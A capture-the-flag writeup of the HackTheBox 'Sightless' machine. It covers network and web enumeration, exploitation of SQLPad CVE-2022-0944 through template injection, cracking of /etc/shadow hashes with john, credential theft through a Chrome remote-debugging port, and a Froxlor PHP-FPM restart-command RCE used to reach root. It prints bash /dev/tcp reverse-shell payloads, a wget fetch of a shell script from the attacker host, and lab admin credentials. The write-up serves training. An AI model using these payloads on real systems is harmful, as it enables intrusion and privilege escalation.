---
title: HackTheBox Sightless Writeup
authors: Samarth
date: 2024-12-01 16:30:00 +0530
categories: [HackTheBox Machines]
tags: [Linux, FTPd, Web, CVE-2022-0944, SQLPad, Froxlor]
math: true
mermaid: true
---

![Sightless - HTB](/assets/images/writeups/Sightless-HTB/banner.png)

## TL;DR

This writeup is based on the [__Sightless__](https://app.hackthebox.com/machines/Sightless) machine, which is an easy-rated Linux box on Hack the Box. It starts with several open ports: FTP (21), SSH (22), and HTTP (80). While enumerating the HTTP service, we discovered the `sqlpad.sightless.htb` subdomain running an outdated version of SQLPad (6.10.0), which is vulnerable to [CVE-2022-0944](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944). We exploited this RCE vulnerability to gain remote code execution (RCE) on the server. After gaining access, we found a `.dockerenv` file, indicating the presence of a Docker container. We enumerated system files, cracked passwords, and obtained user `michael`'s SSH credentials. With these, we logged in via SSH and found the user flag. During privilege escalation, we discovered that an `Froxlor` application was running on a VirtualHost, so I accessed it and found the login panel. Further investigation led me to the `remote-debugging-port`, which pointed me toward the use of the `Google Chrome Debugger` to debug the web application. After debugging the application, I found the admin credentials, which gave me access to the admin dashboard. I came across `PHP-FPM`, which was vulnerable to an [RCE vulnerability](https://sarperavci.com/Froxlor-Authenticated-RCE/) via arbitrary command execution in the `php-fpm restart command` parameter in the `Froxlor` web panel. This allowed us to execute a reverse shell and escalate to root. We successfully gained root access and obtained the root flag. 

## Scanning Network

I began by performing an Nmap scan, which revealed open ports 21, 22, and 80, corresponding to ProFTPD Server, OpenSSH, and Nginx 1.18.0. Here are the results from the Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn 10.10.11.32 -oN scan/normal.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2024-12-15 15:23 IST
Nmap scan report for 10.10.11.32
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94%I=7%D=12/15%Time=675EA730%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20Se
SF:rver\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20tr
SF:y\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20
SF:being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Two services, SSH and HTTP, were detected. Let’s proceed with enumerating the HTTP service.

## Enumeration

The Nmap scan reveals that the IP address is linked to the domain name `sightless.htb`. Therefore, we need to add this domain to the `"/etc/hosts"` file.

Now, let's visit `http://slightless.htb/`.

![Browser View](/assets/images/writeups/Sightless-HTB/1.png)

Let's begin directory fuzzing to identify any hidden directories or parameters.

```bash
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://sightless.htb/FUZZ --hc 404,403
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sightless.htb/FUZZ
Total requests: 20116

=====================================================================
ID           Response   Lines    Word       Chars    Payload     
=====================================================================

000000002:   301        7 L      12 W       178 Ch   "images" 
000004255:   200        105 L    389 W      4993 Ch  "http://sightless.htb/"                                  
000006462:   301        7 L      12 W       178 Ch   "icones"  
```

Unfortunately, no interesting directories were discovered during fuzzing. Let’s browse the website to look for valuable information.

While navigating the site, I discovered a subdomain, `sqlpad.sightless.htb`.

![Subdomain Browser View](/assets/images/writeups/Sightless-HTB/2.png)

Let's browse the `SQLPad` website and enumerate it to run SQL queries or find something interesting.

![SQLPad Version](/assets/images/writeups/Sightless-HTB/3.png)

The SQLPad version identified was `6.10.0`. After researching, I found that this version is vulnerable to [__CVE-2022-0944__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944). 

## Exploitation

`CVE-2022-0944` - This vulnerability allows for template injection via the `/api/test-connection` endpoint in SQLPad versions before 6.10.1, resulting in remote code execution (RCE).

As SQLPad is built with Node.js, I used the `child_process` module to execute arbitrary commands.

Payload - `process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1"');`

I utilized the Python-based [__SQLPad RCE Exploit__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944) for this.

Let's use this exploit to perform template injection in new SQLPad query. 

```bash
python3 exploit.py http://sqlpad.sightless.htb/ <Listener IP> <Listener Port>
```

The above exploit requires the target URL, listener IP, and listener port. Before executing, let's open a netcat listener on port 4444. The exploit sends the query to the server, which initiates a connection and sends back a shell to the netcat listener.

```bash
python3 exploit.py http://sqlpad.sightless.htb/ 10.10.14.70 4444
Response status code: 400
Response body: {"title":"connect ECONNREFUSED 127.0.0.1:3306"}
Exploit sent, but server responded with status code: 400. Check your listener.
```

After sending the exploit, I checked the netcat listener for the shell.

![Netcat Listener](/assets/images/writeups/Sightless-HTB/4.png)

To my surprise, I received root access directly. While browsing the directories, I noticed the presence of `.dockerenv`, confirming that the application runs in a Docker container.

![Docker Container](/assets/images/writeups/Sightless-HTB/5.png)

Upon examining the system's users, I found two usernames: michael and node. These may provide additional opportunities for exploitation.

As now I have access to some user, let's check `/etc/passwd` and `/etc/shadow` files and will crack the hash using `unshadow`.

Accessing `/etc/passwd`

![/etc/passwd](/assets/images/writeups/Sightless-HTB/6.png)

Accessing `/etc/shadow`

![/etc/shadow](/assets/images/writeups/Sightless-HTB/7.png)

I have used `unshadow` tool to combine content of `/etc/passwd` and `/etc/shadow`.

```bash
unshadow passwd shadow > passwd_shadow_combined
```

![unshadow](/assets/images/writeups/Sightless-HTB/8.png)

Now, let's use `john` to crack the hashes and find the passwords.

![Root's and Michael's Password](/assets/images/writeups/Sightless-HTB/9.png)

It's interesting to see that using `john`, I have cracked password for `root` as well as `michael`. I'm pretty sure that the password of root itself indicates that it's not that easy. 

Let's utilise the username as `michael` and use the above password to login using SSH.

![Michael shell](/assets/images/writeups/Sightless-HTB/10.png)

## Post Exploitation

I checked the current user's privileges using `sudo -l`, but `michael` does not belong to the sudoers group.

Next, I searched for SUID files that are executable with their owner's permissions.

```bash
find / -perm /4000 2>/dev/null
```

![Files with permission](/assets/images/writeups/Sightless-HTB/11.png)

After testing for misconfigurations, I used Linpeas to identify potentially exploitable files, directories, and processes.

During this, I discovered a `127.0.0.1:8080` VirtualHost that runs the Froxlor service.

Froxlor is a web hosting control panel. Let's check the active TCP connections and processes using `telnet -tnlp`.

`Froxlor` is a lightweight, open-source web hosting control panel designed to manage hosting environments efficiently. It provides an intuitive graphical interface for users, resellers, and administrators to manage their web hosting accounts, domains, email, FTP, and more. Froxlor is often used as an alternative to popular control panels like cPanel and Plesk.

![netstat -tnlp](/assets/images/writeups/Sightless-HTB/12.png)

I identified that `127.0.0.1:8080` is likely used by the Froxlor service. I proceeded with port forwarding to my machine's IP.

![Froxlor](/assets/images/writeups/Sightless-HTB/13.png)

While browsing and reviewing the running processes on the system, I came across a remote debugging port. I realized that the Google Chrome Debugger could assist in debugging the web application. The `Google Chrome Debugger` is a tool that allows debugging of web applications when the Google Chrome debugger is running on a specific port using the `--remote-debugging-port=<port>` flag. Let's use [__Chrome Remote Debugger Pentesting__](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/) methodology to debug web applications.

![Remote Debugging Port](/assets/images/writeups/Sightless-HTB/14.png)

The `remote-debugging-port=0` configuration means that the remote debugging feature of Google Chrome (or any Chromium-based browser) will not use a fixed port. Instead, Chrome will dynamically assign an available port for remote debugging.

To identify all active TCP connections, I will use the command `netstat -tnlp`.

![Netstat -tnlp](/assets/images/writeups/Sightless-HTB/15.png)

There were many active ports for TCP connections, so I used each port one by one for port forwarding until I established a connection with the Chrome Debugger. Once port forwarding was initiated, I accessed the Google Chrome Debugger via `chrome://inspect/#devices`.

I then began the target discovery in Chrome Developer Tools for the specific port used during port forwarding to check if the connection was successful.

I started with the highest port, `45553`, for port forwarding and used the same port for the Chrome Debugger.
```bash
ssh -L 45553:127.0.0.1:45553 michael@10.10.11.32
```

![Port Forwarding](/assets/images/writeups/Sightless-HTB/16.png)

Once the port forwarding was initiated, I inspected with Chrome Developer Tools (`chrome://inspect/#devices`).

![Chrome Debugger Tool](/assets/images/writeups/Sightless-HTB/17.png)

Once I started the Chrome Debugger, I received remote target access. While inspecting the web application, I received the login credentials for the `Froxlor` service.

![Admin Credential](/assets/images/writeups/Sightless-HTB/18.png)

Let's utilize the credentials and log in as Admin to the `Froxlor` login panel.

`admin:ForlorfroxAdmin`

![Froxlor Dashboard](/assets/images/writeups/Sightless-HTB/19.png)

The dashboard revealed that the version of `Froxlor` was `2.1.8`. While browsing, I came across `PHP-FPM`. Let's understand what `PHP-FPM` does.

FPM (FastCGI Process Manager) is a primary PHP FastCGI implementation, containing features that are mostly useful for heavily loaded sites.

FPM requires the `php-fpm restart command`, the `configuration directory of php-fpm`, and the `process manager control`. Let's combine the `Froxlor` version and `PHP-FPM` and search to see if any vulnerabilities exist for this version.

I searched for `Froxlor RCE` and I have found this blog [__Disclosing Froxlor V2.x Authenticated RCE as Root Vulnerability via PHP-FPM__](https://sarperavci.com/Froxlor-Authenticated-RCE/).

The vulnerability allows running arbitrary commands in the `php-fpm restart command` parameter. In the blog above, it is explained that there are a couple of steps to follow in order to exploit the vulnerability.

__1.__ `First` - Create a one liner reverse shell

```bash
bash -i >& /dev/tcp/<Attacker IP>/<Attacker Listener Port> 0>&1
```

__2.__ `Second` - Transfer this reverse shell (`shell.sh`) to victim machine (`10.10.11.32`)

```bash
 wget http://<Attacker IP address>/shell.sh
 chmod +x shell.sh
 mv shell.sh /tmp
```

__3.__ `Third` - Provide the following payload to `php-fpm restart command` parameter.

```bash
/bin/bash /tmp/shell.sh
```

![PHP-FPM restart command](/assets/images/writeups/Sightless-HTB/20.png)

Once the command is provided, save the settings and start the listener on the attacker's machine.

After setting the custom `PHP-FPM restart command`, go to `System` -> `Settings` and click on `PHP-FPM`. Then, click on disable, wait for a few seconds, and click on enable. This will restart the PHP-FPM service and execute the reverse shell.

Let's wait for a few minutes and then check the listener to see if the root shell has been obtained.

![Root Shell](/assets/images/writeups/Sightless-HTB/21.png)

![Machine Pwned](/assets/images/writeups/Sightless-HTB/Pwned.png)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t).